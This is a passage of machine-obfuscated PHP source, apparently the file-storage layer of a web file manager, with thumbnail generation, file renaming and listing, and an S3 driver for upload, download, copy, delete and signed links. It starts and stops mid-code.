$Eê£ÄÄ¶ÒŒ = 250) { goto b–ÊîİÏÀŞ; c­±Šøß°è: if (!($D²šˆ¨§ä = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $A¹Ì˜‹Òè[161]))) { $Ağ± ’“éÛ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $A¹Ì˜‹Òè[162]); } else { $Ağ± ’“éÛ = KodIO::make($D²šˆ¨§ä); } if ($D²šˆ¨§ä = IO::fileNameExist($Ağ± ’“éÛ, $c™‰îœ³™Ö)) { $fíßì‹ç¿ = KodIO::make($D²šˆ¨§ä); return IO::fileOut($fíßì‹ç¿); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Fìñòøñ¸; Fìñòøñ¸: $fíßì‹ç¿ = DATA_THUMB . $c™‰îœ³™Ö; if (!@file_exists($fíßì‹ç¿)) { $F¹ÄØã‘İ¤ = TEMP_FILES; if (!is_dir($F¹ÄØã‘İ¤)) { mk_dir($F¹ÄØã‘İ¤); } $EçéÓ†Øõ = $F¹ÄØã‘İ¤ . $CÆ‘‡‚ŞØ . $A¹Ì˜‹Òè[91] . $FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[156]]; if (!@file_exists($EçéÓ†Øõ)) { $EçéÓ†Øõ = $this->download($e¸µ´õˆí, $EçéÓ†Øõ); } $F“ÛèªÌ¦ = new ImageThumb($EçéÓ†Øõ, $A¹Ì˜‹Òè[163]); $F“ÛèªÌ¦->prorate($fíßì‹ç¿, $Eê£ÄÄ¶ÒŒ, $Eê£ÄÄ¶ÒŒ * 10); } if (!file_exists($fíßì‹ç¿) || filesize($fíßì‹ç¿) < 100) { return @file_exists($EçéÓ†Øõ) ? IO::fileOut($EçéÓ†Øõ) : $this->fileOut($e¸µ´õˆí); } goto a»¾¼¸å…¹; BœÂÒîŠ: if ($FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[77]] <= 1024 * 50 || !function_exists($A¹Ì˜‹Òè[155]) || $FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[156]] == $A¹Ì˜‹Òè[157]) { return $this->fileOut($e¸µ´õˆí); } if (isset($FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[158]][$A¹Ì˜‹Òè[159]])) { $CÆ‘‡‚ŞØ = $FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[158]][$A¹Ì˜‹Òè[159]]; } else { if (isset($FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[158]][$A¹Ì˜‹Òè[160]])) { $CÆ‘‡‚ŞØ = $FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[158]][$A¹Ì˜‹Òè[160]]; } else { $CÆ‘‡‚ŞØ = md5("{$FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[28]]}\137{$FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[75]]}\137{$FëŞ‰Ã÷¨ï[$A¹Ì˜‹Òè[77]]}"); } } $c™‰îœ³™Ö = "{$CÆ‘‡‚ŞØ}\x5f{$Eê£ÄÄ¶ÒŒ}\56\160\x6e\147"; goto c­±Šøß°è; a»¾¼¸å…¹: if (!($c¯‹¸‹”£ö = IO::move($fíßì‹ç¿, $Ağ± ’“éÛ))) { return IO::fileOut($fíßì‹ç¿); } del_file($fíßì‹ç¿); IO::fileOut($c¯‹¸‹”£ö); goto B¥õ³à¨Š; b–ÊîİÏÀŞ: $A¹Ì˜‹Òè =& $_SERVER[Ö]; if (substr($e¸µ´õˆí, 0, 4) == $A¹Ì˜‹Òè[142]) { $this->fileOutLink($e¸µ´õˆí); } $FëŞ‰Ã÷¨ï = $this->info($e¸µ´õˆí); goto BœÂÒîŠ; B¥õ³à¨Š: } public function fileOutImageServer($FåÕ—ò•ßï, $b¬ÃØõ¸Ç¸ = 250) { $this->fileOutImage($FåÕ—ò•ßï, $b¬ÃØõ¸Ç¸); } public function fileNameAuto($B §°«¾šê, $cïµ’ÔÃ, $dÎµÔµö«Ï = REPEAT_RENAME, $bÎÚØ‰Óƒ = false) { goto cøÔŸ½âÌã; aìçé®ç÷ƒ: if ($dÎµÔµö«Ï == REPEAT_SKIP) { return !1; } $dëˆÌ´Şí = $bÂĞ·‹¹Î‰[91] . get_path_ext($cïµ’ÔÃ); $dëˆÌ´Şí = $dëˆÌ´Şí == $bÂĞ·‹¹Î‰[91] || $bÎÚØ‰Óƒ ? $bÂĞ·‹¹Î‰[33] : $dëˆÌ´Şí; goto dÁì¤¢÷ÎÙ; dÁì¤¢÷ÎÙ: $FêğœÚÑ’¢ = 1; $ağ‰¿Í‚„ = substr($cïµ’ÔÃ, 0, strlen($cïµ’ÔÃ) - strlen($dëˆÌ´Şí)); $aİ‘¨½†¹ = $ağ‰¿Í‚„ . "\50{$FêğœÚÑ’¢}\x29{$dëˆÌ´Şí}"; goto c¬—ƒŞÖÚø; c¬—ƒŞÖÚø: while ($this->exist(rtrim($B §°«¾šê, $bÂĞ·‹¹Î‰[8]) . $bÂĞ·‹¹Î‰[8] . $aİ‘¨½†¹)) { $aİ‘¨½†¹ = $ağ‰¿Í‚„ . "\50{$FêğœÚÑ’¢}\x29{$dëˆÌ´Şí}"; $FêğœÚÑ’¢++; } return $aİ‘¨½†¹; goto D«šÒÛíç¸; cøÔŸ½âÌã: $bÂĞ·‹¹Î‰ =& $_SERVER[Ö]; $dÃˆÀàµÃ› = $B §°«¾šê === $bÂĞ·‹¹Î‰[33] ? $cïµ’ÔÃ : rtrim($B §°«¾šê, $bÂĞ·‹¹Î‰[8]) . $bÂĞ·‹¹Î‰[8] . $cïµ’ÔÃ; if ($dÎµÔµö«Ï == REPEAT_REPLACE || !$this->exist($dÃˆÀàµÃ›) || $bÎÚØ‰Óƒ && $dÎµÔµö«Ï != REPEAT_RENAME_FOLDER) { return $cïµ’ÔÃ; } goto aìçé®ç÷ƒ; D«šÒÛíç¸: } public function listAllFiles($bÃ„™¡Ğó, $D¿ÄÇŒòÔ©, $f¿»òø‹ğ = array()) { goto Cë¬½º‰„µ; C²öŠŞ‘ê¿: foreach (array_unique($BùßòŸŒ¢Ê) as $d†Ò£°Ö²‰) { $Cˆ¡ëÏ¶Ê‡ = array($aÅá£²¼èš[75] => $this->getPathOuter($aÅá£²¼èš[8] . $bÃ„™¡Ğó . $aÅá£²¼èš[8] . $d†Ò£°Ö²‰), $aÅá£²¼èš[76] => 1, $aÅá£²¼èš[77] => 0); if (substr($d†Ò£°Ö²‰, -1) != $aÅá£²¼èš[8]) { $Cˆ¡ëÏ¶Ê‡[$aÅá£²¼èš[76]] = 0; $FÖïáÌáÕœ = $this->getPath($bÃ„™¡Ğó . $aÅá£²¼èš[8] . $d†Ò£°Ö²‰); $Cˆ¡ëÏ¶Ê‡[$aÅá£²¼èš[77]] = isset($f¿»òø‹ğ[$FÖïáÌáÕœ]) ? $f¿»òø‹ğ[$FÖïáÌáÕœ] : $this->size($FÖïáÌáÕœ); } $Bˆæ±‘ˆ¶[] = $Cˆ¡ëÏ¶Ê‡; } return $Bˆæ±‘ˆ¶; goto c°¥Ø°ƒ×Ô; d£”¶«ó: $bÃ„™¡Ğó = trim($bÃ„™¡Ğó, $aÅá£²¼èš[8]); foreach ($D¿ÄÇŒòÔ© as $d†Ò£°Ö²‰) { $c¦ŒĞÚáÑ¿ = ltrim(substr($d†Ò£°Ö²‰, strlen($bÃ„™¡Ğó)), $aÅá£²¼èš[8]); $BùßòŸŒ¢Ê = array_merge($BùßòŸŒ¢Ê, $this->slicePath($c¦ŒĞÚáÑ¿)); } $Bˆæ±‘ˆ¶ = array(); goto C²öŠŞ‘ê¿; Cë¬½º‰„µ: $aÅá£²¼èš =& $_SERVER[Ö]; if (empty($D¿ÄÇŒòÔ©)) { return array(); } $BùßòŸŒ¢Ê = array(); goto d£”¶«ó; c°¥Ø°ƒ×Ô: } public function slicePath($fÆ¥Î¿„à›) { $F±İ‰— =& $_SERVER[Ö]; $F½ÕÊ½×ÄÆ = explode($F±İ‰—[8], trim($fÆ¥Î¿„à›, $F±İ‰—[8])); $EÂÏ ÕßÌ = 0; do { ++$EÂÏ ÕßÌ; $BØÃƒÛ‘”ö[] = implode($F±İ‰—[8], array_slice($F½ÕÊ½×ÄÆ, 0, $EÂÏ ÕßÌ)) . $F±İ‰—[8]; } while ($EÂÏ ÕßÌ < count($F½ÕÊ½×ÄÆ)); $BØÃƒÛ‘”ö[count($F½ÕÊ½×ÄÆ) - 1] = $fÆ¥Î¿„à›; return $BØÃƒÛ‘”ö; } public function getHost() { $Aššƒ‚è×Ò =& $_SERVER[Ö]; $B˜·Ïíìë = parse_url(trim($this->domain, $Aššƒ‚è×Ò[8])); $fÇ¯‘ÁÂ„ = isset($B˜·Ïíìë[$Aššƒ‚è×Ò[164]]) ? $B˜·Ïíìë[$Aššƒ‚è×Ò[164]] : http_type(); $AêÓÚ½Ùï = isset($B˜·Ïíìë[$Aššƒ‚è×Ò[165]]) ? $B˜·Ïíìë[$Aššƒ‚è×Ò[165]] : $B˜·Ïíìë[$Aššƒ‚è×Ò[75]]; if (isset($B˜·Ïíìë[$Aššƒ‚è×Ò[166]])) { $AêÓÚ½Ùï .= $Aššƒ‚è×Ò[4] . $B˜·Ïíìë[$Aššƒ‚è×Ò[166]]; } return $fÇ¯‘ÁÂ„ . $Aššƒ‚è×Ò[167] . $AêÓÚ½Ùï; } public function pathEncode($Fµ¢Û‡â‡ã) { $D£…æÄ’ë£ =& $_SERVER[Ö]; return str_replace($D£…æÄ’ë£[168], $D£…æÄ’ë£[8], rawurlencode($Fµ¢Û‡â‡ã)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($B«½²…±¹ƒ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ö][169]; parent::__construct(); $this->_init($B«½²…±¹ƒ); } public function _init($DÛœÅù¨Õ½) { foreach ($DÛœÅù¨Õ½ as $AéàˆàÊ” => $cò²´µÔò) { if (isset($this->{$AéàˆàÊ”})) { $this->{$AéàˆàÊ”} = $cò²´µÔò; } } $this->endpoint = $DÛœÅù¨Õ½[$_SERVER[Ö][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($eæÀ«Œéƒ = "\x76\64") { $this->signVer = $eæÀ«Œéƒ; $this->client->setSignatureVersion($eæÀ«Œéƒ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto AÔĞŸä›ĞÔ; E¥‹ »ğÔŠ: $Fœ¨œù¥¯Š = array($bÊˆ¸¨èë[176], $bÊˆ¸¨èë[177], $bÊˆ¸¨èë[178], $bÊˆ¸¨èë[179], $bÊˆ¸¨èë[180]); $Eç«‡êÍ¢‹ = array_diff($Fœ¨œù¥¯Š, $Fº©ğÆâ‘ß); return empty($Eç«‡êÍ¢‹); goto cÈõ´©ÊÃ£; d¼ÀóîßÍÄ: if ($D¤Ã¨·ÕËí[$bÊˆ¸¨èë[171]] != $bÊˆ¸¨èë[172] || $D¤Ã¨·ÕËí[$bÊˆ¸¨èë[173]] != $bÊˆ¸¨èë[172]) { return !1; } $Fº©ğÆâ‘ß = array_map($bÊˆ¸¨èë[174], $D¤Ã¨·ÕËí[$bÊˆ¸¨èë[175]]); if (!is_array($Fº©ğÆâ‘ß)) { $Fº©ğÆâ‘ß = array(); } goto E¥‹ »ğÔŠ; AÔĞŸä›ĞÔ: $bÊˆ¸¨èë =& $_SERVER[Ö]; $D¤Ã¨·ÕËí = $this->getBucketCors(); if (!$D¤Ã¨·ÕËí || !is_array($D¤Ã¨·ÕËí)) { return !1; } goto d¼ÀóîßÍÄ; cÈõ´©ÊÃ£: } public function mkfile($a‚öîí½é¯, $dõ×œ‹¨í = '', $dÍÇíÕ¢Ø = REPEAT_RENAME) { $d‚æ£¹©ïŒ = $this->setContent($a‚öîí½é¯, $dõ×œ‹¨í); if ($d‚æ£¹©ïŒ !== !1) { return $this->getPathOuter($a‚öîí½é¯); } return !1; } public function mkdir($C¤À‘÷ÙôÙ, $eõ„õ±Ü¸ = REPEAT_SKIP) { if (empty($C¤À‘÷ÙôÙ)) { return !1; } if ($this->_isFolder($C¤À‘÷ÙôÙ)) { return $this->getPathOuter($C¤À‘÷ÙôÙ); } $Bã…ÂÈ©¯» = $this->setContent($C¤À‘÷ÙôÙ, $_SERVER[Ö][33], !0); if ($Bã…ÂÈ©¯» !== !1) { return $this->getPathOuter($C¤À‘÷ÙôÙ); } return !1; } public function copyFile($AÔÅÉ›ê’õ, $aì×â£¶îº, $A¢Æ³¸‚ñ = array()) { $eÌô“ŒÇÅ =& $_SERVER[Ö]; $BÏÎèÀØ = $this->objectMeta($AÔÅÉ›ê’õ); if (!$BÏÎèÀØ) { return !1; } if ($BÏÎèÀØ[$eÌô“ŒÇÅ[77]] <= 1024 * 1024 * 200) { $aÑ¡ÃÈ‰ = $this->client->copyObject($this->bucket, $AÔÅÉ›ê’õ, $this->bucket, $aì×â£¶îº, $eÌô“ŒÇÅ[181], $A¢Æ³¸‚ñ); } else { $aÑ¡ÃÈ‰ = $this->client->multiCopyObject($this->bucket, $AÔÅÉ›ê’õ, $this->bucket, $aì×â£¶îº, $A¢Æ³¸‚ñ); } $aÑ¡ÃÈ‰ = $aÑ¡ÃÈ‰ ? $this->getPathOuter($aì×â£¶îº) : !1; return $aÑ¡ÃÈ‰; } public function moveFile($bãÒĞË–¾•, $AÁ”¬Úœ¬è) { if ($this->copyFile($bãÒĞË–¾•, $AÁ”¬Úœ¬è)) { $this->delFile($bãÒĞË–¾•); return $this->getPathOuter($AÁ”¬Úœ¬è); } return !1; } public function delFile($E¤“‰›ÇÃ) { return $this->client->deleteObject($this->bucket, $E¤“‰›ÇÃ); } public function delFolder($F°¢†Ê˜å) { goto d„ßê«êœ; C©Ÿƒ’„š†: return $A‹°´¾šÉÀ === $f¡¨ÛŠÚºé ? !0 : !1; goto DÇŒ“›ää ; d„ßê«êœ: $aåÊ±İÑé =& $_SERVER[Ö]; $Bº…°Õ¡ö± = $this->listObjs($F°¢†Ê˜å); if (!$Bº…°Õ¡ö±) { $F°¢†Ê˜å = trim($F°¢†Ê˜å, $aåÊ±İÑé[8]); if (!empty($F°¢†Ê˜å)) { $F°¢†Ê˜å .= $aåÊ±İÑé[8]; } return $this->delFile($F°¢†Ê˜å); } goto E–§ò˜À‡; E–§ò˜À‡: $A‹°´¾šÉÀ = $f¡¨ÛŠÚºé = 0; $CÎòÁ¾‚‡ = array_chunk(array_keys($Bº…°Õ¡ö±), 1000); foreach ($CÎòÁ¾‚‡ as $F®Š¿à÷È†) { $A‹°´¾šÉÀ++; $f¡¨ÛŠÚºé += (int) $this->client->deleteObjects($this->bucket, $F®Š¿à÷È†); } goto C©Ÿƒ’„š†; DÇŒ“›ää : } public function rename($f±Å”è¶‡², $AÎ¼«Ş‡Ò”) { return $this->renameObject($f±Å”è¶‡², $AÎ¼«Ş‡Ò”); } public function listPath($F’±Œ¢Ó, $d‘®Ù¶Ã¼ = false) { $eŒ‡Ÿ‡ìÃ• =& $_SERVER[Ö]; $FíĞ‚ˆ¾ˆö = $this->listObjs($F’±Œ¢Ó, null, null, $eŒ‡Ÿ‡ìÃ•[8]); $EãØÍÅ‰õ¼ = array($eŒ‡Ÿ‡ìÃ•[74] => array(), $eŒ‡Ÿ‡ìÃ•[73] => array()); foreach ($FíĞ‚ˆ¾ˆö as $B©öåÆ¹¾à => $eæ›‰È™›½) { if ($B©öåÆ¹¾à == $eŒ‡Ÿ‡ìÃ•[8]) { continue; } if (isset($eæ›‰È™›½[$eŒ‡Ÿ‡ìÃ•[182]])) { $EãØÍÅ‰õ¼[$eŒ‡Ÿ‡ìÃ•[74]][] = $this->folderInfo($eæ›‰È™›½[$eŒ‡Ÿ‡ìÃ•[182]], $d‘®Ù¶Ã¼); } else { if (substr($eæ›‰È™›½[$eŒ‡Ÿ‡ìÃ•[28]], -1) == $eŒ‡Ÿ‡ìÃ•[8]) { continue; } $EãØÍÅ‰õ¼[$eŒ‡Ÿ‡ìÃ•[73]][] = $this->fileInfo($eæ›‰È™›½[$eŒ‡Ÿ‡ìÃ•[28]], $d‘®Ù¶Ã¼, $eæ›‰È™›½); } } return $EãØÍÅ‰õ¼; } private function fileInfo($Fªª×ˆ‰À¯, $f¹àÜç¦ = false, $eîÅ¥¤²± = array()) { goto e·ˆö‡š; eï³ã‡÷: if (empty($eîÅ¥¤²±)) { $eîÅ¥¤²± = $this->objectMeta($Fªª×ˆ‰À¯); if (!$eîÅ¥¤²±) { return $D×·˜•êé´; } } if (isset($eîÅ¥¤²±[$fÎÙÉ£èã[186]])) { $D×·˜•êé´[$fÎÙÉ£èã[106]] = $eîÅ¥¤²±[$fÎÙÉ£èã[186]]; } if (isset($eîÅ¥¤²±[$fÎÙÉ£èã[77]])) { $D×·˜•êé´[$fÎÙÉ£èã[77]] = $eîÅ¥¤²±[$fÎÙÉ£èã[77]]; } goto bºê¬Ô™â; bºê¬Ô™â: return $D×·˜•êé´; goto Cò¦±¡Ä; e·ˆö‡š: $fÎÙÉ£èã =& $_SERVER[Ö]; if ($f¹àÜç¦) { return array($fÎÙÉ£èã[28] => $this->pathThis($Fªª×ˆ‰À¯), $fÎÙÉ£èã[75] => $this->getPathOuter($Fªª×ˆ‰À¯), $fÎÙÉ£èã[29] => $fÎÙÉ£èã[163], $fÎÙÉ£èã[156] => $this->ext($Fªª×ˆ‰À¯), $fÎÙÉ£èã[77] => isset($eîÅ¥¤²±[$fÎÙÉ£èã[77]]) ? $eîÅ¥¤²±[$fÎÙÉ£èã[77]] : 0, $fÎÙÉ£èã[183] => 0, $fÎÙÉ£èã[106] => 0, $fÎÙÉ£èã[184] => !0, $fÎÙÉ£èã[185] => !0); } $D×·˜•êé´ = array($fÎÙÉ£èã[28] => $this->pathThis($Fªª×ˆ‰À¯), $fÎÙÉ£èã[75] => $this->getPathOuter($Fªª×ˆ‰À¯), $fÎÙÉ£èã[29] => $fÎÙÉ£èã[163], $fÎÙÉ£èã[183] => 0, $fÎÙÉ£èã[106] => 0, $fÎÙÉ£èã[77] => 0, $fÎÙÉ£èã[156] => $this->ext($Fªª×ˆ‰À¯), $fÎÙÉ£èã[184] => !0, $fÎÙÉ£èã[185] => !0); goto eï³ã‡÷; Cò¦±¡Ä: } private function folderInfo($f¤Æœ…Œá, $dÉÓ½†ğ“  = false) { goto AğÃ çêäæ; AğÃ çêäæ: $Aæ¾½¢Àº£ =& $_SERVER[Ö]; if ($dÉÓ½†ğ“ ) { return array($Aæ¾½¢Àº£[28] => $this->pathThis($f¤Æœ…Œá), $Aæ¾½¢Àº£[75] => $this->getPathOuter($Aæ¾½¢Àº£[8] . $f¤Æœ…Œá), $Aæ¾½¢Àº£[29] => $Aæ¾½¢Àº£[76], $Aæ¾½¢Àº£[184] => !0, $Aæ¾½¢Àº£[185] => !0); } $E‚²° ›ë = array($Aæ¾½¢Àº£[28] => $this->pathThis($f¤Æœ…Œá), $Aæ¾½¢Àº£[75] => $this->getPathOuter($Aæ¾½¢Àº£[8] . $f¤Æœ…Œá), $Aæ¾½¢Àº£[29] => $Aæ¾½¢Àº£[76], $Aæ¾½¢Àº£[183] => 0, $Aæ¾½¢Àº£[106] => 0, $Aæ¾½¢Àº£[184] => !0, $Aæ¾½¢Àº£[185] => !0); goto d§Ÿ ”šÕ; Aâƒ®õ“—½: if (isset($bÑĞÔÄ¨Ç[$Aæ¾½¢Àº£[186]])) { $E‚²° ›ë[$Aæ¾½¢Àº£[183]] = $bÑĞÔÄ¨Ç[$Aæ¾½¢Àº£[186]]; } return $E‚²° ›ë; goto EˆĞÙò­ñ¶; d§Ÿ ”šÕ: if ($f¤Æœ…Œá == $Aæ¾½¢Àº£[33]) { return $E‚²° ›ë; } $f¤Æœ…Œá = trim($f¤Æœ…Œá, $Aæ¾½¢Àº£[8]) . $Aæ¾½¢Àº£[8]; $bÑĞÔÄ¨Ç = $this->objectMeta($f¤Æœ…Œá); goto Aâƒ®õ“—½; EˆĞÙò­ñ¶: } public function listObjs($dÁáË†Ø, $DğèÖÔÎÏĞ = null, $AÌ÷»£¿ø• = null, $e˜‡çäÅ—é = null) { $d“”¬÷Œ’£ =& $_SERVER[Ö]; $dÁáË†Ø = trim($dÁáË†Ø, $d“”¬÷Œ’£[8]); $cÃÅ‚Ä·Ã = empty($dÁáË†Ø) ? $d“”¬÷Œ’£[33] : $dÁáË†Ø . $d“”¬÷Œ’£[8]; return $this->client->getBucket($this->bucket, $cÃÅ‚Ä·Ã, $DğèÖÔÎÏĞ, $AÌ÷»£¿ø•, $e˜‡çäÅ—é, !0); } public function has($a·İ†ğ©Óİ, $D±©èŸ•á = false, $B•Ìñ˜™Ïâ = true) { goto E¤¿–Ù–¤­; AÆòÊøîŸÈ: $bàêñÂ†„Ğ = $this->listObjs($a·İ†ğ©Óİ, null, null, $aÎÄˆËš‚É[8]); $bàêñÂ†„Ğ = is_array($bàêñÂ†„Ğ) ? $bàêñÂ†„Ğ : array(); foreach ($bàêñÂ†„Ğ as $cøÑ‡Ç„ñˆ) { if (isset($cøÑ‡Ç„ñˆ[$aÎÄˆËš‚É[28]]) && substr($cøÑ‡Ç„ñˆ[$aÎÄˆËš‚É[28]], -1) != $aÎÄˆËš‚É[8]) { if (!$D±©èŸ•á && $B•Ìñ˜™Ïâ) { return !0; } $dæïŒæÊÚ®++; } else { if (isset($cøÑ‡Ç„ñˆ[$aÎÄˆËš‚É[182]])) { if (!$D±©èŸ•á && !$B•Ìñ˜™Ïâ) { return !1; } $CÚ‘Ñ¾Í˜«++; } } } goto BÖ” ¸ÌÅµ; E¤¿–Ù–¤­: $aÎÄˆËš‚É =& $_SERVER[Ö]; $dæïŒæÊÚ® = 0; $CÚ‘Ñ¾Í˜« = 0; goto AÆòÊøîŸÈ; BÖ” ¸ÌÅµ: if ($D±©èŸ•á) { return array($aÎÄˆËš‚É[187] => $dæïŒæÊÚ®, $aÎÄˆËš‚É[188] => $CÚ‘Ñ¾Í˜«); } return !1; goto FÅ¿æ°´Â; FÅ¿æ°´Â: } public function listAll($f¬ªÁÙ·) { $C¯áíÒ›šÆ =& $_SERVER[Ö]; $bŠ–ÉÄ¯ó = $this->listObjs($f¬ªÁÙ·); $FƒÒÂ¾ğñ = $dÑÅøÃ¼ª = array(); foreach ($bŠ–ÉÄ¯ó as $d«â„ÇÔĞğ => $Dô¹™º†óÈ) { $FƒÒÂ¾ğñ[] = $Dô¹™º†óÈ[$C¯áíÒ›šÆ[28]]; $dÑÅøÃ¼ª[$d«â„ÇÔĞğ] = $Dô¹™º†óÈ[$C¯áíÒ›šÆ[77]]; } return $this->listAllFiles($f¬ªÁÙ·, $FƒÒÂ¾ğñ, $dÑÅøÃ¼ª); } public function canRead($aÙ‡´™†›¥) { $D‘ñÀÊÍ– =& $_SERVER[Ö]; $B Œä°Œ = $this->client->getAccessControlPolicy($this->bucket, $aÙ‡´™†›¥); if (!$B Œä°Œ) { return !1; } return in_array($B Œä°Œ, array($D‘ñÀÊÍ–[189], $D‘ñÀÊÍ–[190], $D‘ñÀÊÍ–[191])) ? !0 : !1; } public function canWrite($f¨àÚÃªˆ) { $d³Úã†“± =& $_SERVER[Ö]; $E©ìõŞ·‘ = $this->client->getAccessControlPolicy($this->bucket, $f¨àÚÃªˆ); if (!$E©ìõŞ·‘) { return !1; } return in_array($E©ìõŞ·‘, array($d³Úã†“±[189], $d³Úã†“±[190])) ? !0 : !1; } public function getContent($e›Òê’¯‰Ô) { return $this->client->getObject($this->bucket, $e›Òê’¯‰Ô); } public function setContent($eàŒà¢¨íâ, $E„óˆÈ¨†Ú = '', $F˜‰ëÇ¡ŞÃ = false) { goto FÍ‚±à©š„; C²’ÓÃò¢‘: $d’–¨÷ì = $this->copyFile($eàŒà¢¨íâ, $eàŒà¢¨íâ, array($A±åêÙ®š[192] => $d’–¨÷ì[$A±åêÙ®š[193]])); return $d’–¨÷ì ? !0 : !1; goto F¼Ü¯Øí¨; FºËĞºƒÌ: $d’–¨÷ì = $this->client->putObject($E„óˆÈ¨†Ú, $this->bucket, $eàŒà¢¨íâ, $A±åêÙ®š[181], array(), $Bé¾Ï˜¸ô); if (!$d’–¨÷ì) { return !1; } if ($F˜‰ëÇ¡ŞÃ) { return !0; } goto C²’ÓÃò¢‘; FÍ‚±à©š„: $A±åêÙ®š =& $_SERVER[Ö]; $eàŒà¢¨íâ = $F˜‰ëÇ¡ŞÃ ? trim($eàŒà¢¨íâ, $A±åêÙ®š[8]) . $A±åêÙ®š[8] : $eàŒà¢¨íâ; $Bé¾Ï˜¸ô = get_file_mime(get_path_ext($eàŒà¢¨íâ)); goto FºËĞºƒÌ; F¼Ü¯Øí¨: } public function fileSubstr($b°ØËÑ¶”, $d™à‚ªÃ, $C¸•í˜‰) { $BÓå¢‰ÑÃ„ = $d™à‚ªÃ + $C¸•í˜‰ - 1; return $this->client->getObject($this->bucket, $b°ØËÑ¶”, array($_SERVER[Ö][194] => "\x62\x79\x74\x65\163\75{$d™à‚ªÃ}\x2d{$BÓå¢‰ÑÃ„}")); } public function upload($DË¨ãÜ¢®, $eŸ‡ê‚, $Eğ™ƒÜÒ£¢ = false, $C˜ÄÍª­Ó = REPEAT_REPLACE) { $A¾˜îÉêù´ =& $_SERVER[Ö]; $AµğÃë§› = array($A¾˜îÉêù´[192] => @md5_file($eŸ‡ê‚)); $dÑÛµîö = array($A¾˜îÉêù´[195] => get_file_mime(get_path_ext($DË¨ãÜ¢®))); if (IO::size($eŸ‡ê‚) <= 1024 * 1024 * 200) { $FìÑªê¢º = $this->client->putObjectFile($eŸ‡ê‚, $this->bucket, $DË¨ãÜ¢®, $A¾˜îÉêù´[181], $AµğÃë§›, $dÑÛµîö); return !empty($FìÑªê¢º) ? $this->getPathOuter($DË¨ãÜ¢®) : !1; } $BÇ­£Œ´Ğ³ = $this->client->multiUploadObject($eŸ‡ê‚, $this->bucket, trim($DË¨ãÜ¢®, $A¾˜îÉêù´[8]), $AµğÃë§›, $dÑÛµîö); return $BÇ­£Œ´Ğ³ ? $this->getPathOuter($DË¨ãÜ¢®) : !1; } public function download($e–§îïàã, $AåÃ„ÚÆ«Ê) { if (!@is_dir($this->pathFather($AåÃ„ÚÆ«Ê)) && !IO::mkdir($this->pathFather($AåÃ„ÚÆ«Ê))) { return !1; } $B°“Äæ”È‘ = $this->client->getObject($this->bucket, $e–§îïàã, array(), $AåÃ„ÚÆ«Ê); return $B°“Äæ”È‘ !== !1 ? $AåÃ„ÚÆ«Ê : !1; } public function link($bŒòÏ…©ö¼, $AŸÍÂè·ŒË = array()) { $c‹„®î“Ê´ =& $_SERVER[Ö]; if ($this->signVer == $c‹„®î“Ê´[196]) { return $this->client->getAuthenticatedURL($this->bucket, $bŒòÏ…©ö¼, 3600 * 12, $AŸÍÂè·ŒË); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($bŒòÏ…©ö¼, $c‹„®î“Ê´[8]), 3600 * 12, $this->region, array(), !0, $AŸÍÂè·ŒË); } public function fileOut($dÆï²¬ëóå, $eÅºõæñ’… = false, $Fœò›èæí¶ = false, $bÀ›–âÆÁ = '') { goto a­¬Øİ³««; F¾Ø©…‘: $D¼ ×ˆÍ = $this->link($dÆï²¬ëóå, $f±òõÛ˜´Ò); $this->fileOutLink($D¼ ×ˆÍ); goto a™Å ˜ã“ã; a­¬Øİ³««: $aãä„ğ ‘ =& $_SERVER[Ö]; if (!$Fœò›èæí¶) { $Fœò›èæí¶ = $this->pathThis($dÆï²¬ëóå); } $EğÇ®Ü™…… = get_file_mime(get_path_ext($Fœò›èæí¶)); goto Bğë˜¼„“·; Bğë˜¼„“·: if ($EğÇ®Ü™…… == $aãä„ğ ‘[197]) { return parent::fileOut($dÆï²¬ëóå, $eÅºõæñ’…, $Fœò›èæí¶, $bÀ›–âÆÁ); } $eÅºõæñ’… = $eÅºõæñ’… ? $aãä„ğ ‘[198] : $aãä„ğ ‘[199]; $f±òõÛ˜´Ò = array($aãä„ğ ‘[200] => $eÅºõæñ’… . $aãä„ğ ‘[201] . rawurlencode($Fœò›èæí¶), $aãä„ğ ‘[202] => $EğÇ®Ü™……); goto F¾Ø©…‘; a™Å ˜ã“ã: } public function fileOutServer($föç‹Ã–¼, $cÆµ†¦ƒ° = false, $b´Ÿê¡Óîù = false, $C«¼òáÜÓ¾ = '') { parent::fileOut($föç‹Ã–¼, $cÆµ†¦ƒ°, $b´Ÿê¡Óîù, $C«¼òáÜÓ¾); } public function fileOutImage($Cñé¨Ñä ‹, $Fç°§«»…” = 250) { $FóÂß¢ÑÛ— = $this->link($Cñé¨Ñä ‹); $this->fileOutLink($FóÂß¢ÑÛ—); } public function fileOutImageServer($eßÄò«„«‡, $FµˆÔ›³êİ = 250) { parent::fileOutImage($eßÄò«„«‡, $FµˆÔ›³êİ); } public function hashMd5($d†¯±¥¶Íõ, $F¦—Ü¥³¾ä = '') { $c†‹Ä²ù© =& $_SERVER[Ö]; $b„ó¸Ê™ = $this->objectMeta($d†¯±¥¶Íõ); if (!$b„ó¸Ê™) { return !1; } $F¦—Ü¥³¾ä = $F¦—Ü¥³¾ä ? $F¦—Ü¥³¾ä : _get($b„ó¸Ê™, $c†‹Ä²ù©[203]); $F¦—Ü¥³¾ä = $F¦—Ü¥³¾ä ? $F¦—Ü¥³¾ä : _get($b„ó¸Ê™, 